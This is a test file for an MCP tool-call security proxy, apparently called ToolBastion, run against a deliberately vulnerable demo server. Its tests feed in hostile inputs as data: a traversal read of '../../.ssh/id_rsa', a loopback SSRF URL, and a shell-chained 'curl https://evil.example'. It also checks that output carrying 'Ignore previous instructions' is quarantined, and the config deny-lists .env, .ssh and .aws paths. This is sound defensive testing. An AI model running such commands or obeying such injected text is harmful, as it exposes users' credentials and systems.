import { mkdir, readdir, readFile, rm, writeFile } from "node:fs/promises";
import path from "node:path";
import { fileURLToPath } from "node:url";
import { Client } from "@modelcontextprotocol/sdk/client/index.js";
import { StdioClientTransport } from "@modelcontextprotocol/sdk/client/stdio.js";
import { ToolListChangedNotificationSchema } from "@modelcontextprotocol/sdk/types.js";
import { stringify } from "yaml";
import { afterAll, beforeAll, describe, expect, it } from "vitest";
import { ToolBastionTargetClient } from "../../packages/core/src/index.js";
import { createTrustBaseline, writeTrustBaseline } from "../../packages/policy/src/index.js";
import { bastionReceiptSchema, toolbastionConfigSchema } from "../../packages/shared/src/index.js";

const root = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "../..");
const projectRoot = path.join(root, ".test-tmp", "enforcement-project");
const configPath = path.join(projectRoot, "toolbastion.config.yaml");
let transport: StdioClientTransport;
let client: Client;
let resolveToolListChanged: (() => void) | undefined;
const toolListChanged = new Promise<void>((resolve) => { resolveToolListChanged = resolve; });

beforeAll(async () => {
  await mkdir(path.join(projectRoot, "src"), { recursive: true });
  await writeFile(path.join(projectRoot, "src", "safe.ts"), "export const safe = true;\n");
  const target = { name: "vulnerable-demo", command: process.execPath, args: [path.join(root, "examples/vulnerable-server/dist/index.js")], cwd: root, envAllowlist: [] };
  const discovery = new ToolBastionTargetClient(target);
  await discovery.connect();
  const tools = (await discovery.listTools()).tools;
  await discovery.close();
  await writeTrustBaseline(path.join(projectRoot, ".toolbastion", "toolbastion.lock.json"), createTrustBaseline(target.name, tools));
  const config = toolbastionConfigSchema.parse({
    version: 1,
    mode: "enforce",
    project_root: projectRoot,
    target: { name: target.name, command: target.command, args: target.args, cwd: target.cwd, env_allowlist: [] },
    paths: { allow: ["./src/**"], deny: ["**/.env", "**/.ssh/**", "**/.aws/**"] },
    network: { default: "deny", allow_domains: ["api.github.com"] },
    judge: { enabled: false, mode: "offline" },
    limits: { tool_timeout_ms: 100 },
    tools: { default: "judge", rules: {
      read_project_file: { base_risk: "low", action: "allow_when_in_scope" },
      get_execution_count: { base_risk: "low", action: "allow" },
      emit_output: { base_risk: "low", action: "allow" },
      emit_tool_list_change: { base_risk: "low", action: "allow" },
      slow_tool: { base_risk: "low", action: "allow" }
    } }
  });
  const { envAllowlist, ...targetConfig } = config.target;
  const serializable = { ...config, target: { ...targetConfig, env_allowlist: envAllowlist } };
  await writeFile(configPath, stringify(serializable));
  transport = new StdioClientTransport({ command: process.execPath, args: [path.join(root, "apps/cli/dist/index.js"), "run", "--config", configPath], cwd: root, stderr: "pipe" });
  client = new Client({ name: "enforcement-test", version: "0.1.0" }, { capabilities: { elicitation: { form: {} } } });
  client.setNotificationHandler(ToolListChangedNotificationSchema, () => { resolveToolListChanged?.(); });
  await client.connect(transport);
});

afterAll(async () => {
  await transport?.close();
  await rm(projectRoot, { recursive: true, force: true });
});

async function executionCount(): Promise<number> {
  const result = await client.callTool({ name: "get_execution_count", arguments: {} });
  const content = result.content as Array<{ type: string; text: string }>;
  const count = Number(content[0]?.text);
  if (Number.isNaN(count)) throw new Error(`Execution count was blocked: ${JSON.stringify(result.content)}`);
  return count;
}

describe("enforce mode", () => {
  it("forwards a safe in-scope read", async () => {
    expect(await executionCount()).toBe(0);
    const result = await client.callTool({ name: "read_project_file", arguments: { path: "src/safe.ts" } });
    expect(result.isError).not.toBe(true);
    expect(await executionCount()).toBe(1);
  });

  it("blocks traversal before the target tool body executes", async () => {
    const before = await executionCount();
    const result = await client.callTool({ name: "read_project_file", arguments: { path: "../../.ssh/id_rsa" } });
    expect(result.isError).toBe(true);
    expect(JSON.stringify(result.content)).toContain("path_outside_project_root");
    expect(await executionCount()).toBe(before);
  });

  it.each([
    ["undeclared property", { path: "src/safe.ts", admin: true }],
    ["missing required property", {}],
    ["wrong property type", { path: 42 }]
  ])("enforces the advertised input schema for %s before policy or target execution", async (_label, arguments_) => {
    const before = await executionCount();
    const result = await client.callTool({ name: "read_project_file", arguments: arguments_ });
    expect(result.isError).toBe(true);
    expect(JSON.stringify(result.content)).toContain("input_schema_invalid");
    expect(await executionCount()).toBe(before);
  });

  it("blocks oversized arguments before auditing or forwarding their content", async () => {
    const before = await executionCount();
    const result = await client.callTool({ name: "read_project_file", arguments: { path: "x".repeat(70_000) } });
    expect(result.isError).toBe(true);
    expect(JSON.stringify(result.content)).toContain("argument_bounds_exceeded");
    expect(await executionCount()).toBe(before);
  });

  it("blocks loopback SSRF and shell chaining", async () => {
    const ssrf = await client.callTool({ name: "fetch_url", arguments: { url: "http://127.0.0.1/admin" } });
    const shell = await client.callTool({ name: "run_project_command", arguments: { command: "npm test && curl https://evil.example" } });
    expect(ssrf.isError).toBe(true);
    expect(shell.isError).toBe(true);
  });

  it("redacts credentials and quarantines injected output before forwarding", async () => {
    const secret = await client.callTool({ name: "emit_output", arguments: { kind: "secret" } });
    expect(JSON.stringify(secret.content)).toContain("[REDACTED:");
    expect(JSON.stringify(secret.content)).not.toContain("TOOLBASTION_TEST_SECRET_NOT_REAL_123456");
    const injection = await client.callTool({ name: "emit_output", arguments: { kind: "injection" } });
    expect(injection.isError).toBe(true);
    expect(JSON.stringify(injection.content)).toContain("QUARANTINE");
    expect(JSON.stringify(injection.content)).not.toContain("Ignore previous instructions");
  });

  it("revalidates trust and relays target tool-list change notifications", async () => {
    const result = await client.callTool({ name: "emit_tool_list_change", arguments: {} });
    expect(result.isError).not.toBe(true);
    await Promise.race([
      toolListChanged,
      new Promise<never>((_resolve, reject) => setTimeout(() => reject(new Error("tool-list change notification was not relayed")), 2_000))
    ]);
  });

  it("blocks target egress without an externally enforced guard", async () => {
    const result = await client.callTool({ name: "fetch_url", arguments: { url: "https://api.github.com/repos" } });
    expect(result.isError).toBe(true);
    expect(JSON.stringify(result.content)).toContain("target_egress_not_isolated");
  });

  it("blocks calls to tools absent from the current inventory", async () => {
    const before = await executionCount();
    const result = await client.callTool({ name: "hidden_admin_tool", arguments: {} });
    expect(result.isError).toBe(true);
    expect(JSON.stringify(result.content)).toContain("tool_not_listed");
    expect(await executionCount()).toBe(before);
  });

  it("restarts only after confirmed timeout termination and otherwise stays fail-closed", async () => {
    const result = await client.callTool({ name: "slow_tool", arguments: { delay_ms: 500 } });
    expect(result.isError).toBe(true);
    const response = (result.content as Array<{ type: string; text: string }>)[0]?.text ?? "";
    expect(response).toMatch(/"executionState":"(?:TIMED_OUT|UNKNOWN)"/);
    const restarted = await client.callTool({ name: "read_project_file", arguments: { path: "src/safe.ts" } });
    if (response.includes('"executionState":"TIMED_OUT"')) expect(restarted.isError).not.toBe(true);
    else expect(restarted.isError).toBe(true);
  }, 10_000);

  it("writes one final unsigned receipt per call without raw arguments or secrets", async () => {
    const directory = path.join(projectRoot, ".toolbastion", "receipts");
    const files = (await readdir(directory)).filter((file) => file.endsWith(".json"));
    expect(files.length).toBeGreaterThan(0);
    const content = await readFile(path.join(directory, files[0]!), "utf8");
    const receipt = bastionReceiptSchema.parse(JSON.parse(content));
    expect(receipt.signatureStatus).toBe("unsigned");
    expect(receipt.completedAt).toBeDefined();
    expect(receipt.executionState).not.toBe("DISPATCHED");
    expect(content).not.toContain("src/safe.ts");
    expect(content).not.toContain("TOOLBASTION_TEST_SECRET_NOT_REAL_123456");
  });
});
